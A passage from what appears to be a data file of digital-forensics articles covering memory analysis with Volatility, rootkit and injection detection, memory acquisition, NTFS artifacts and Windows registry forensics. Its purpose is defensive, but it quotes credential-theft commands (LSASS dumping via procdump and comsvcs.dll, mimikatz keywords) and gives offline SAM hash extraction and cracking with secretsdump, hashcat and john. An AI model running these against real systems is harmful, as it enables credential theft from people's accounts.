/VadS/ { tag=1 }
tag && /EXECUTE/ { print; tag=0 }
'
```

## Process Hollowing — Detailed

```bash
# Step 1: Suspicious command line (no expected args):
vol.py -f memory.raw windows.cmdline | grep svchost
# Legitimate: C:\Windows\System32\svchost.exe -k NetworkService
# Hollowed:   (empty args or wrong path)

# Step 2: Dump executable image:
vol.py -f memory.raw windows.procdump --pid <pid>
sha256sum procdump.<pid>.exe

# Step 3: Hash mismatch vs. known-good confirms hollowing

# Step 4: malfind on PID:
vol.py -f memory.raw windows.malfind --pid <pid>
# May show RWX private at image base (original mapping replaced)
```

## Cobalt Strike Detection in Memory

```bash
vol.py -f memory.raw windows.malfind --pid <pid> --dump
yara cs_beacon.yar dump/pid.*.dmp

# CS config extraction:
python cs-decrypt-beacon.py dump/pid.1234.vad.0x...dmp
```

## Metasploit Meterpreter

```bash
vol.py -f memory.raw windows.malfind | grep -i "metsrv\|meterpreter"
strings dump/*.dmp | grep -i "metsrv\|mettle"
vol.py -f memory.raw windows.netscan | grep <pid>
# ESTABLISHED to attacker IP on port 4444 or 443
```

## Injection Finding Report

```
Finding: Code Injection in svchost.exe (PID 1848)

malfind: VAD 0x3c0000-0x43ffff
  Tag: VadS | Protection: PAGE_EXECUTE_READWRITE
  First bytes: 4d 5a (MZ header = injected PE)

procdump hash: abc123...
Expected hash: def456...  → MISMATCH

netscan: PID 1848 ESTABLISHED 185.220.x.x:443

Injected PE YARA: CobaltStrike_Beacon match

Conclusion: Process hollowing with CS beacon in svchost.exe
```
""",
    },
    {
        "title": "Extracting Credentials from Memory — LSASS Analysis, Mimikatz Artifacts",
        "tags": ["credentials", "lsass", "mimikatz", "memory-forensics", "volatility"],
        "content": """# Credential Extraction from Memory

## LSASS Process

`lsass.exe` stores: NT hashes, Kerberos tickets, WDigest plaintext passwords, DPAPI master keys.

```bash
# Verify legitimate LSASS:
vol.py -f memory.raw windows.pstree | grep -i "wininit\|lsass"
# Should show: wininit.exe → lsass.exe

vol.py -f memory.raw windows.cmdline | grep lsass
# Legitimate: "C:\Windows\system32\lsass.exe"
# Single instance; no unusual arguments
```

## Volatility Credential Plugins

```bash
vol.py -f memory.raw windows.hashdump      # SAM NT/LM hashes
vol.py -f memory.raw windows.cachedump     # Cached domain credentials (DCC2)
vol.py -f memory.raw windows.lsadump       # LSA secrets
```

## pypykatz

```bash
pip install pypykatz

# Dump LSASS PID:
LSASS_PID=$(vol.py -f memory.raw windows.pslist | awk '/lsass/{print $1}')
vol.py -f memory.raw windows.memmap --pid $LSASS_PID --dump

# Analyze:
pypykatz lsa minidump pid.$LSASS_PID.dmp

# Output sections:
# MSV      — NT hashes
# WDigest  — plaintext (if UseLogonCredential=1)
# Kerberos — TGT/TGS tickets
# DPAPI    — master keys
# Credman  — Windows Credential Manager entries
```

## Mimikatz Artifacts in Memory

```bash
# Command lines containing mimikatz syntax:
vol.py -f memory.raw windows.cmdline | grep -i "sekurlsa\|lsadump\|privilege::debug"

# YARA scan:
yara -r mimikatz_rules.yar memory.raw

# Handles to LSASS from non-system processes:
vol.py -f memory.raw windows.handles | grep <lsass_pid>
# Non-SYSTEM process with PROCESS_VM_READ on LSASS = credential theft
```

## Common LSASS Dump Methods

```bash
# These appear in cmdline/event logs — look for them:

# 1. ProcDump:
# procdump.exe -ma lsass.exe lsass.dmp

# 2. comsvcs.dll (LOLBin):
# rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <pid> lsass.dmp full

# 3. Task Manager: lsass.dmp in %USERPROFILE%\AppData\Local\Temp\

vol.py -f memory.raw windows.cmdline | grep -iE "procdump|comsvcs|minidump|lsass"
```

## Kerberos Ticket Analysis

```bash
vol.py -f memory.raw windows.kerberos
# or via pypykatz output

# Golden Ticket: ServiceName = krbtgt, valid for 10 years = attacker-forged
# Silver Ticket: ServiceName = specific service (CIFS/DC01), no domain auth needed
# Kerberoasting: multiple TGS tickets for service accounts (offline cracking)
```

## WDigest Config

```bash
vol.py -f memory.raw windows.registry.printkey \
    --key "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
# UseLogonCredential = 1 → attacker enabled plaintext passwords
# Normal = 0 or key absent
```
""",
    },
    {
        "title": "Rootkit Detection — SSDT Hooks, DKOM, Hidden Processes",
        "tags": ["rootkit", "ssdt", "dkom", "memory-forensics", "volatility", "dfir"],
        "content": """# Rootkit Detection in Memory

## Rootkit Types

| Type | Level | Persistence Method |
|---|---|---|
| User-mode | Ring 3 | IAT/EAT hooks, DLL injection |
| Kernel-mode | Ring 0 | SSDT hooks, DKOM, IRP hooks |
| Bootkit | Pre-OS | MBR/VBR infection |
| UEFI | Ring -2 | SPI flash modification |

## DKOM Detection

DKOM hides processes by unlinking EPROCESS from `ActiveProcessLinks` — invisible to Task Manager but detectable by pool scanning.

```bash
# pslist (ActiveProcessLinks — manipulable):
vol.py -f memory.raw windows.pslist

# psscan (pool-tag scan — bypasses DKOM):
vol.py -f memory.raw windows.psscan

# Processes in psscan but not pslist = DKOM hidden:
python3 << 'EOF'
import subprocess, re

def pids(plugin):
    out = subprocess.run(["vol.py","-f","memory.raw",f"windows.{plugin}"],
                         capture_output=True, text=True).stdout
    return set(re.findall(r'^(\d+)', out, re.M))

hidden = pids("psscan") - pids("pslist")
print("DKOM hidden PIDs:", hidden or "None")
EOF
```

## SSDT Hook Detection

```bash
vol.py -f memory.raw windows.ssdt
# Each entry should be within ntoskrnl.exe or win32k.sys
# Any entry pointing outside = hook

# WinDbg SSDT check:
dq nt!KiServiceTable L?100
lm m ntoskrnl   # Get address range
# Compare SSDT entry addresses to ntoskrnl range
```

## IRP Hook Detection

```bash
vol.py -f memory.raw windows.driverirp
# All 28 IRP major handlers should point within the driver's own module
# Handler pointing to different module = IRP hook by rootkit
```

## Hidden Drivers

```bash
vol.py -f memory.raw windows.modules     # ActiveDriverLinks traversal
vol.py -f memory.raw windows.driverscan  # Pool scan for DRIVER_OBJECT

# Drivers in driverscan but not modules = hidden driver
diff <(vol.py -f mem.raw windows.modules | awk '{print $NF}' | sort) \
     <(vol.py -f mem.raw windows.driverscan | awk '{print $NF}' | sort)
```

## Bootkit Detection

```bash
# Extract MBR (sector 0):
python3 -c "
with open('disk.img','rb') as f:
    mbr = f.read(512)
print(f'MBR sig: {mbr[510:512].hex()}')  # Should be 55aa
print(f'First 8: {mbr[:8].hex()}')
# Known clean MBR: 33 c0 8e d0 ...
"
```

## UEFI Rootkit Analysis

```bash
pip install chipsec
python chipsec_main.py -m tools.uefi.scan_image -a bios.bin

# UEFITool: parse and visualize UEFI firmware modules
# CosmicStrand/MosaicAggressor indicators:
# - Extra modules in DXE phase with no legitimate source
# - Modified EFI modules (checksum mismatch)
# - Unusual SMM handler additions
```

## Full Detection Workflow

```bash
vol.py -f memory.raw windows.pslist  > pslist.txt
vol.py -f memory.raw windows.psscan  > psscan.txt
diff pslist.txt psscan.txt           # Hidden processes

vol.py -f memory.raw windows.ssdt | grep UNKNOWN  # SSDT hooks

vol.py -f memory.raw windows.modules   > modules.txt
vol.py -f memory.raw windows.driverscan > driverscan.txt
diff modules.txt driverscan.txt       # Hidden drivers

vol.py -f memory.raw windows.driverirp | grep -v "\\Windows\\System32"  # IRP hooks

vol.py -f memory.raw windows.netscan   # Hidden network connections
```
""",
    },
    {
        "title": "Memory Acquisition — WinPmem, LiME, DumpIt",
        "tags": ["memory-acquisition", "winpmem", "lime", "dumpit", "dfir"],
        "content": """# Memory Acquisition

## Why Memory Acquisition Matters

Physical memory contains evidence unavailable on disk: running processes, network connections, decrypted payloads, credentials, and fileless malware. Must be acquired before shutdown.

## Windows

### WinPmem

```bash
winpmem_mini_x64_rc2.exe memory.raw
winpmem_mini_x64_rc2.exe --compress memory.raw.gz
winpmem_mini_x64_rc2.exe \\192.168.1.100\share\memory.raw  # Direct to network share
winpmem_mini_x64_rc2.exe --hash memory.raw  # SHA256 verification
```

Source: https://github.com/Velocidex/WinPmem (Apache 2.0)

### DumpIt

```
DumpIt.exe /OUTPUT C:\memory.raw
DumpIt.exe /OUTPUT \\server\share\memory.raw
# Creates SHA256 hash automatically
```

### FTK Imager

```
File > Capture Memory
Destination: network share or clean external drive
Include pagefile.sys: Yes
```

## Linux

### LiME

```bash
apt install linux-headers-$(uname -r) build-essential
git clone https://github.com/504ensicslabs/lime.git
cd lime/src && make

# Acquire to file:
insmod lime-$(uname -r).ko "path=/tmp/memory.lime format=lime"

# Acquire over network (no disk write on target):
insmod lime.ko "path=tcp:4444 format=lime"
# Receiving workstation:
nc <target_ip> 4444 > memory.lime
```

### avml (Azure/Cloud)

```bash
wget https://github.com/microsoft/avml/releases/latest/download/avml
chmod +x avml
./avml memory.lime
# Supports direct upload to S3/Azure Blob
```

## Chain of Custody Documentation

```
Case: IR-2025-0042
Evidence: Memory image of WORKSTATION-01
Acquired: 2025-03-15 14:32:07 UTC
By: John Smith (IR analyst)

System: Windows 10 22H2, 16 GB RAM
Tool: WinPmem v4.0.rc1
Command: winpmem_mini_x64_rc2.exe --format raw memory.raw
Output: WORKSTATION-01_20250315-143207.raw
Size: 17,179,869,184 bytes
SHA256: abc123...def456

Storage: Evidence drive Seagate 1TB (S/N: XXXXXXXX)
Copy: \evidence-server\IR-2025-0042\

Notes: System active during acquisition. No shutdown performed.
```

## Opening Images in Volatility 3

```bash
vol.py -f memory.raw windows.info     # Raw format (WinPmem, DumpIt)
vol.py -f memory.dmp windows.info     # Crash dump format
vol.py -f memory.lime linux.info      # LiME format (Linux)
```

## Cloud VM Acquisition

```bash
# AWS EC2 via SSM:
aws ssm send-command --document-name AWS-RunPowerShellScript \
  --targets Key=instanceids,Values=i-1234567890 \
  --parameters commands=["winpmem.exe C:\\memory.raw"]

# VMware ESXi snapshot creates .vmem file (raw memory):
vim-cmd vmsvc/snapshot.create <vmid> "ForensicSnap" "" true true
# .vmem in VM directory = raw memory image
```
""",
    },
    {
        "title": "Volatility Registry Analysis and Network Connection Forensics",
        "tags": ["volatility", "registry", "network-forensics", "memory-forensics"],
        "content": """# Registry and Network Forensics from Memory

## Registry Analysis

### Hive Listing

```bash
vol.py -f memory.raw windows.registry.hivelist
# Shows: Virtual, Physical, Name for all loaded hives
# Key hives: SYSTEM, SOFTWARE, SAM, SECURITY, NTUSER.DAT
```

### Key Extraction

```bash
# Persistence (Run keys):
vol.py -f memory.raw windows.registry.printkey \
    --key "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

# Services:
vol.py -f memory.raw windows.registry.printkey \
    --key "SYSTEM\\CurrentControlSet\\Services"

# Winlogon (shell/userinit hijacking):
vol.py -f memory.raw windows.registry.printkey \
    --key "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
# Shell should be "explorer.exe", Userinit should be userinit.exe only

# WDigest (plaintext credential caching):
vol.py -f memory.raw windows.registry.printkey \
    --key "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
# UseLogonCredential = 1 = attacker enabled plaintext storage

# LSA security packages (malicious SSP injection):
vol.py -f memory.raw windows.registry.printkey \
    --key "SYSTEM\\CurrentControlSet\\Control\\Lsa"
# SecurityPackages: unexpected entries = malicious SSP DLL

# Recently executed programs:
vol.py -f memory.raw windows.registry.userassist
vol.py -f memory.raw windows.registry.shimcache
```

## Network Connection Analysis

```bash
vol.py -f memory.raw windows.netscan
# Columns: Protocol, LocalAddr, LocalPort, ForeignAddr, ForeignPort, State, PID, Owner

# Established connections:
vol.py -f memory.raw windows.netscan | grep ESTABLISHED

# All unique foreign ports:
vol.py -f memory.raw windows.netscan | awk '{print $6}' | sort -u
# Flag: 4444, 1337, 31337, 8080, 8443 = common RAT/C2 ports

# Connections by PID:
SUSPICIOUS_PID=1848
vol.py -f memory.raw windows.netscan | grep $SUSPICIOUS_PID
```

### Correlating Connections to Processes

```bash
# Full picture for suspicious PID:
vol.py -f memory.raw windows.pstree  | grep $SUSPICIOUS_PID
vol.py -f memory.raw windows.cmdline | grep $SUSPICIOUS_PID
vol.py -f memory.raw windows.dlllist --pid $SUSPICIOUS_PID
vol.py -f memory.raw windows.netscan | grep $SUSPICIOUS_PID
vol.py -f memory.raw windows.malfind --pid $SUSPICIOUS_PID
```

### DNS Cache from Memory

```bash
# DNS cache lives in svchost running dnscache service
DNSCACHE_PID=$(vol.py -f mem.raw windows.pslist | awk '/svchost.*dns/{print $1}' | head -1)
vol.py -f memory.raw windows.memmap --pid $DNSCACHE_PID --dump

strings pid.$DNSCACHE_PID.dmp | grep -E "[a-z0-9.-]{4,}\.[a-z]{2,6}" | \
  grep -v "microsoft\|windows\|adobe\|google" | sort -u
```

## Memory Analysis Report Template

```
MEMORY FORENSICS REPORT
Case: IR-2025-0042 | Image: WORKSTATION-01_20250315.raw

EXECUTIVE SUMMARY:
CS beacon injected into svchost.exe (PID 1848),
credential theft via LSASS dump, active C2 to 185.220.101.45.

TIMELINE:
14:02 UTC — Malicious macro: WINWORD.EXE → powershell.exe
14:03 UTC — PowerShell downloaded shellcode
14:04 UTC — Shellcode injected into svchost.exe (PID 1848)
14:05 UTC — LSASS opened with PROCESS_VM_READ by PID 1848
14:06 UTC — C2 beacon: 185.220.101.45:443 ESTABLISHED

FINDINGS:
1. INJECTION: svchost.exe PID 1848 — RWX VadS with MZ header, YARA: CS beacon
2. CREDENTIALS: LSASS handles + pypykatz shows 3 domain account hashes
3. PERSISTENCE: HKCU Run key → C:\Users\user\AppData\svchost32.exe

ACTIONS:
1. Isolate workstation
2. Reset 3 compromised accounts
3. Block 185.220.101.45 at perimeter
4. Hunt for lateral movement from this host
```
""",
    },
    {
        "title": "Windows Kernel Forensics — Pool Tags, Object Headers, Driver Analysis",
        "tags": ["kernel-forensics", "pool-tags", "drivers", "windbg", "memory-forensics"],
        "content": """# Windows Kernel Forensics

## Pool Memory and Tags

The Windows kernel uses tagged pool allocations. Each allocation has a 4-byte tag identifying its type.

### Common Pool Tags

| Tag | Object | Forensic Use |
|---|---|---|
| `Proc` (0x636F7250) | EPROCESS | Find hidden processes |
| `Thre` | ETHREAD | Thread objects |
| `File` | FILE_OBJECT | Open file handles |
| `Driv` | DRIVER_OBJECT | Loaded drivers |
| `TcpE` | TCP_ENDPOINT | TCP connections |
| `UdpA` | UDP_ENDPOINT | UDP sockets |
| `Mutant` | KMUTANT | Mutex (C2 check-in mutexes) |

### Pool Scanning with Volatility

```bash
vol.py -f memory.raw windows.psscan       # Scan for EPROCESS ('Proc')
vol.py -f memory.raw windows.driverscan   # Scan for DRIVER_OBJECT ('Driv')
vol.py -f memory.raw windows.filescan     # Scan for FILE_OBJECT ('File')
vol.py -f memory.raw windows.mutantscan   # Scan for KMUTANT ('Mutant')
# Cross-ref with pslist/modules to find hidden objects
```

## Object Headers

Every kernel object has an `_OBJECT_HEADER` preceding the body:

```c
typedef struct _OBJECT_HEADER {
    LONG_PTR  PointerCount;
    LONG_PTR  HandleCount;
    UCHAR     TypeIndex;        // Index into ObpObjectTypes[]
    UCHAR     InfoMask;
    UCHAR     Flags;
    PVOID     SecurityDescriptor;
    QUAD      Body;             // Object body follows here
} OBJECT_HEADER;
```

```windbg
!object \Device\HarddiskVolume1    ; examine an object
dt _OBJECT_HEADER <address>          ; raw structure dump
dt _EPROCESS <address>               ; process structure
dt _EPROCESS <address> ImageFileName ; specific field only
```

## Driver Analysis

```windbg
!drvobj \Driver\suspect full
; Shows: DriverStart, DriverSize, DriverEntry, all 28 IRP handlers

; Suspicious: IRP handler pointing outside driver's own module range
; Legitimate: all handlers within DriverStart to DriverStart+DriverSize
```

```bash
vol.py -f memory.raw windows.driverscan
# Suspicious paths (not C:\Windows\System32\drivers\*.sys):
vol.py -f memory.raw windows.modules | grep -iv "\\windows\\system32"

# Dump suspicious driver for Ghidra analysis:
vol.py -f memory.raw windows.dumpfiles --virtaddr <driver_base>
```

## SSDT Analysis

```bash
vol.py -f memory.raw windows.ssdt
# Index, Address, Module, Symbol
# Legitimate: all addresses within ntoskrnl.exe or win32k.sys
# Hooked: address outside both = rootkit intercept

# WinDbg:
dq nt!KiServiceTable L?200   ; dump SSDT
lm m ntoskrnl                 ; get address range for comparison
```

## Detection Workflow

```bash
# 1. Hidden processes
diff <(vol.py -f mem.raw windows.pslist  | awk '{print $1}' | sort) \
     <(vol.py -f mem.raw windows.psscan  | awk '{print $1}' | sort)

# 2. SSDT hooks
vol.py -f mem.raw windows.ssdt | grep UNKNOWN

# 3. Hidden drivers
diff <(vol.py -f mem.raw windows.modules   | awk '{print $NF}' | sort) \
     <(vol.py -f mem.raw windows.driverscan| awk '{print $NF}' | sort)

# 4. IRP hooks
vol.py -f mem.raw windows.driverirp | grep -v "\\Windows\\System32"

# 5. Dump suspicious driver
vol.py -f mem.raw windows.dumpfiles --virtaddr <base>
# Analyze with: die, strings, yara, Ghidra
```
""",
    },
]


DISK_FORENSICS = [
    {
        "title": "NTFS Forensics — MFT, $LogFile, $UsnJrnl, Alternate Data Streams",
        "tags": ["ntfs", "mft", "usnjrnl", "ads", "disk-forensics", "dfir"],
        "content": """# NTFS Forensics

## NTFS Key Metadata Files

| File | Location | Contents |
|---|---|---|
| $MFT | Cluster 0 | Master File Table — one 1KB record per file/directory |
| $LogFile | $Volume | Transaction log (NTFS journal for crash recovery) |
| $UsnJrnl:$J | \\$Extend\\$UsnJrnl | Change journal — file create/delete/rename events |
| $Boot | Sector 0 | Boot sector + NTFS BPB |
| $Bitmap | Root | Cluster allocation bitmap |
| $BadClus | Root | Bad cluster map |

## Master File Table ($MFT)

Every NTFS file/directory has at least one 1024-byte MFT record.

### Key MFT Attributes

| Attribute | Type ID | Contents |
|---|---|---|
| $STANDARD_INFORMATION | 0x10 | Created, Modified, MFT Modified, Accessed timestamps |
| $FILE_NAME | 0x30 | Filename + second set of timestamps |
| $DATA | 0x80 | File content (resident if < ~700 bytes, else cluster runs) |
| $INDEX_ROOT | 0x90 | Directory B-tree root |
| $ATTRIBUTE_LIST | 0x20 | Pointer to extension records |

### Timestamp Forensics (MACB)

NTFS maintains two sets of timestamps:
- **$STANDARD_INFORMATION** (user-visible): Modified, Accessed, Created, MFT Changed
- **$FILE_NAME**: Same four, but harder to modify (requires kernel access)

```
Timestomping indicator: $SI timestamps are identical (attacker reset all to same value)
OR: $SI timestamps are earlier than $FN timestamps
$FN timestamps not easily spoofed — good ground truth
```

### MFT Analysis Tools

```bash
# MFTECmd (Eric Zimmerman) — parse MFT to CSV:
MFTECmd.exe -f "C:\$MFT" --csv output\ --csvf mft_parsed.csv
MFTECmd.exe -f "E:\image\$MFT" --csv output\ --csvf mft_parsed.csv

# mft2csv (Python):
pip install mft
python mft2csv.py -f $MFT -o mft_output.csv

# Volatility:
vol.py -f memory.raw windows.mftscan   # MFT records from memory

# Timeline Explorer (EZ Tools) — GUI for MFT CSV analysis
```

```python
# Python: parse MFT with the mft library
from mft import PyMFT
mft = PyMFT("$MFT")
for record in mft:
    if record.is_active:
        si = record.standard_information
        fn = record.file_name
        print(f"{fn.filename} | Created: {si.created} | Modified: {si.modified}")
```

## $UsnJrnl Change Journal

The USN Journal records all file system changes (create, delete, rename, write, security change).

```bash
# Extract $UsnJrnl:$J from live system:
fsutil usn readjournal C: csv > usnjrnl.csv

# Extract from disk image with MFTECmd:
MFTECmd.exe -f "E:\image\$J" --csv output\ --csvf usnjrnl.csv

# Key fields:
# TimeStamp, MFTEntryNumber, ParentMFTEntryNumber, Filename, Reason

# Useful queries:
# Find deleted files:
grep "FILE_DELETE" usnjrnl.csv

# Find renamed files:
grep "RENAME" usnjrnl.csv | grep -i ".exe"

# Find files created in suspicious dirs:
grep "FILE_CREATE" usnjrnl.csv | grep -iE "temp|appdata|programdata"
```

## $LogFile

The $LogFile records NTFS metadata operations for crash recovery.

```bash
# Parse $LogFile for deleted file metadata:
# LogFileParser (by Jochen Metzger)
LogFileParser.exe -f $LogFile -o logfile_output.csv

# Key use case: recover deleted file metadata even after deletion
# Log entries show pre- and post-operation state
```

## Alternate Data Streams (ADS)

ADS allows data to be hidden in named streams of a file.

```powershell
# List ADS on system:
Get-Item * -Stream * | Where-Object {$_.Stream -ne ':$Data'}

# List ADS of specific file:
Get-Item malware.exe -Stream *

# Create ADS (attacker technique):
# echo "hidden data" > legitimate.txt:hidden_stream

# Read ADS content:
Get-Content legitimate.txt:hidden_stream
more < legitimate.txt:hidden_stream

# Delete ADS:
Remove-Item legitimate.txt -Stream hidden_stream
```

```bash
# Linux tools for NTFS ADS:
ntfs-3g mount with streams support
getfattr -n ntfs.streams.list /mnt/ntfs/file.txt
getfattr -n user.stream_name /mnt/ntfs/file.txt

# MFTECmd parses and lists all ADS in MFT output
# Zone.Identifier is a common legitimate ADS (marks downloaded files)
# Suspicious: executable content hidden in text file ADS
```

## Zone.Identifier — Download Tracking

```bash
# Windows adds Zone.Identifier ADS to downloaded files:
Get-Content downloaded_malware.exe:Zone.Identifier
# [ZoneTransfer]
# ZoneId=3          # Zone 3 = Internet
# ReferrerUrl=https://...
# HostUrl=https://...
# Attackers delete this to hide download origin
# Missing Zone.Identifier on executable = possible anti-forensics
```
""",
    },
    {
        "title": "Windows Artifact Analysis — Prefetch, Amcache, ShimCache, SRUM",
        "tags": ["prefetch", "amcache", "shimcache", "srum", "windows-artifacts", "disk-forensics"],
        "content": """# Windows Execution Artifacts

## Prefetch

Windows Prefetch tracks program execution to speed up subsequent launches. Stores last 8 run times (Vista+) and file dependencies.

```
Location: C:\Windows\Prefetch\
Format:   <PROGRAM_NAME>-<HASH>.pf
Hash:     CRC32 of the full executable path
Stores:   Last 8 run times, file references, volume serial numbers
```

### Parsing

```bash
# PECmd.exe (Eric Zimmerman):
PECmd.exe -f "C:\Windows\Prefetch\MALWARE.EXE-AABBCCDD.pf"
PECmd.exe -d "C:\Windows\Prefetch\" --csv output\ --csvf prefetch.csv

# Output includes:
# - Source Created/Modified timestamps
# - Last run time (most recent of 8)
# - All 8 run times
# - Run count
# - Files loaded (DLLs, config files, data files)
# - Volumes accessed

# Key investigative uses:
# Prove execution of malware.exe even after file deletion
# Determine first/last execution time
# See what files the malware accessed
```

### Prefetch on Windows Server

Prefetch is disabled by default on Windows Server. It can be enabled:
```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters
EnablePrefetcher: 3 (enable application + boot prefetch)
```

## Amcache

Amcache records SHA1 hashes and metadata of executed programs and installed drivers.

```
Location: C:\Windows\appcompat\Programs\Amcache.hve (Windows 8+)
Previous: C:\Windows\AppCompat\Programs\RecentFileCache.bcf (Win7)
```

```bash
# AmcacheParser.exe (Eric Zimmerman):
AmcacheParser.exe -f "C:\Windows\appcompat\Programs\Amcache.hve" --csv output\

# Output files:
# Amcache_AssociatedFileEntries.csv  — executable SHA1 hashes, paths, compile time
# Amcache_UnassociatedFileEntries.csv
# Amcache_DeviceContainers.csv       — USB/device history

# Key fields: SHA1, FullPath, FileDescription, ProductName, Publisher, LinkDate
# Use SHA1 to look up on VirusTotal (partial hash coverage)
```

## ShimCache (AppCompatCache)

ShimCache records program execution metadata for application compatibility purposes.

```
Location: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
          AppCompatCache value (binary data)
Also: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache
```

```bash
# AppCompatCacheParser.exe (Eric Zimmerman):
AppCompatCacheParser.exe -f SYSTEM --csv output\ --csvf shimcache.csv

# Fields: LastModifiedTimeUTC, Path, Executed (flag not always reliable)
# Note: records program's presence on disk even if NOT executed
# Combined with Prefetch: presence (Shim) + execution (Prefetch)

# Timestomping detection: compare ShimCache timestamp vs. Prefetch timestamps
# If Shim shows file modified after Prefetch last run = suspicious
```

## SRUM (System Resource Usage Monitor)

SRUM records 30-60 days of application resource usage, network usage, and push notification data.

```
Location: C:\Windows\System32\srum\SRUDB.dat (ESE database)
```

```bash
# srum-dump (Mark Baggett):
python srum-dump.py SRUDB.dat -r SOFTWARE -o srum_report.xlsx

# Eric Zimmerman SrumECmd:
SrumECmd.exe -f "C:\Windows\System32\srum\SRUDB.dat" --csv output\

# Tables:
# {D10CA2FE-6FCF-4F6D-848E-B2E99266FA89} — Application Resource Usage
#   AppId, UserSid, ForegroundCycleTime, BackgroundCycleTime, NetworkBytesRaw
# {973F5D5C-1D90-4944-BE8E-24B94231A174} — Network Data Usage
#   AppId, UserSid, BytesSent, BytesRecvd, InterfaceLuid
# {7ACBBAA3-D029-4BE4-9A7A-0885927F1D8F} — Network Connections
#   AppId, UserSid, ConnectStartTime, ConnectedTime

# Investigate malware: search by executable name in AppId column
# Find: exact bytes sent/received to C2, duration of C2 session
# Even if malware deleted: SRUM retains 30-60 day history
```

## Jump Lists

```
Location: %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\
          %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\

# JLECmd.exe (Eric Zimmerman):
JLECmd.exe -d "%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\" --csv output\

# Contains: recently opened files, application IDs, timestamps
# Forensic value: prove interaction with specific files
```

## LNK Files

```bash
# LNK files created when user double-clicks a file
# Location: %APPDATA%\Microsoft\Windows\Recent\
# Also: Desktop, Start Menu, taskbar pinned items

# LECmd.exe (Eric Zimmerman):
LECmd.exe -f "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent\malware.exe.lnk"
LECmd.exe -d "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent\" --csv output\

# Contains: target path, timestamps of target at time of linking,
#           machine hostname and volume serial of target (even network shares)
# Useful: prove file existed at specific path on specific date
```
""",
    },
    {
        "title": "Windows Registry Forensics — SAM, SYSTEM, SOFTWARE, NTUSER.DAT",
        "tags": ["registry", "sam", "ntuser-dat", "windows-forensics", "disk-forensics"],
        "content": """# Windows Registry Forensics

## Registry Hive Files

| Hive | Path | Contents |
|---|---|---|
| SYSTEM | C:\Windows\System32\config\SYSTEM | Services, hardware, network config |
| SOFTWARE | C:\Windows\System32\config\SOFTWARE | Installed apps, system settings |
| SAM | C:\Windows\System32\config\SAM | Local accounts and hashed passwords |
| SECURITY | C:\Windows\System32\config\SECURITY | LSA secrets, cached domain credentials |
| NTUSER.DAT | C:\Users\<user>\ | Per-user settings, MRUs, typed URLs |
| UsrClass.dat | C:\Users\<user>\AppData\Local\Microsoft\Windows\ | Shell extension settings |
| AMCACHE.hve | C:\Windows\AppCompat\Programs\ | Execution history |

## Tools

```bash
# RegRipper — automated extraction of forensic artifacts:
rip.pl -r NTUSER.DAT -f ntuser     # Run all NTUSER.DAT plugins
rip.pl -r SOFTWARE -f software     # Run all SOFTWARE plugins
rip.pl -r SYSTEM -f system         # Run all SYSTEM plugins
rip.pl -r SAM -f sam               # Extract account info

# Registry Explorer (Eric Zimmerman) — GUI hive browser
# RECmd.exe — command-line hive parser
RECmd.exe -f NTUSER.DAT --kn "Software\Microsoft\Windows\CurrentVersion\Run" --csv output\
```

## SAM — Local Accounts

```bash
# SAM contains NT hashes for local accounts (encrypted with SYSKEY)
# Requires SYSTEM hive for SYSKEY

# impacket secretsdump.py (offline):
python secretsdump.py -sam SAM -system SYSTEM LOCAL
# Output: admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Interpret: username:RID:LM_hash:NT_hash
# NT hash 31d6cfe0... = empty password

# Crack NT hash:
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
john --format=NT hashes.txt --wordlist=rockyou.txt
```

## SYSTEM Hive Forensics

```bash
# Current control set:
RECmd.exe -f SYSTEM --kn "Select" --csv output\
# Current value indicates active control set (001 or 002)

# Installed services (persistence/malware):
RECmd.exe -f SYSTEM --kn "ControlSet001\Services" --csv output\
# Look for: services with suspicious ImagePath (not in System32\drivers)
# Type = 16 (own process) or 32 (shared process) + Start = 2 (auto)

# USB device history (via USBSTOR):
RECmd.exe -f SYSTEM --kn "ControlSet001\Enum\USBSTOR" --csv output\
# Shows all USB storage devices ever connected

# Network interface info:
RECmd.exe -f SYSTEM --kn "ControlSet001\Services\Tcpip\Parameters\Interfaces" --csv output\
```

## SOFTWARE Hive Forensics

```bash
# Installed programs:
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows\CurrentVersion\Uninstall" --csv output\

# Run keys (system-wide):
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows\CurrentVersion\Run" --csv output\
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows\CurrentVersion\RunOnce" --csv output\

# Windows Defender exclusions (attackers add these):
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows Defender\Exclusions\Paths" --csv output\

# .NET installed versions:
RECmd.exe -f SOFTWARE --kn "Microsoft\NET Framework Setup\NDP" --csv output\

# AppInit_DLLs (DLL loaded into every user-mode process):
RECmd.exe -f SOFTWARE --kn "Microsoft\Windows NT\CurrentVersion\Windows" --csv output\
# AppInit_DLLs value: any non-empty value = DLL injection into all processes
```

## NTUSER.DAT — User Activity

```bash
# RecentDocs (files recently opened):
rip.pl -r NTUSER.DAT -p recentdocs

# TypedURLs (URLs typed in IE/Edge):
rip.pl -r NTUSER.DAT -p typedurls

# UserAssist (programs launched via Explorer, ROT13-encoded):
rip.pl -r NTUSER.DAT -p userassist
# Or: RECmd.exe with UserAssist key

# Run keys (user-specific persistence):
RECmd.exe -f NTUSER.DAT --kn "Software\Microsoft\Windows\CurrentVersion\Run" --csv output\

# ShellBags (folders accessed via Explorer — including deleted/network folders):
rip.pl -r NTUSER.DAT -p shellbags
# ShellBagsExplorer.exe (GUI) for easier analysis

# MuiCache (executed program display names):
RECmd.exe -f NTUSER.DAT --kn "Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" --csv output\
